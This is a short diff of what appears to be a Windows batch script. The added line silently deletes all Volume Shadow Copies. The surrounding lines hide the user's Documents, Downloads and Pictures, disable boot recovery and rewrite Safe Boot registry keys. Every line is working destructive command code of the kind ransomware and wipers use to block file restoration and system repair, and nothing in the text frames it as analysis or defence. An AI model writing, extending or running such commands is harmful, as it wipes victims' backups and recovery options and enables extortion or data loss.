@@ -28,6 +28,7 @@ attrib +h +s "%USERPROFILE%\Documents\*" /s /d
 attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
 attrib +h +s "%USERPROFILE%\Pictures\*" /s /d
 bcdedit /set {default} recoveryenabled no
+vssadmin delete shadows /all /quiet >nul
 bcdedit /deletevalue {current} safeboot >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
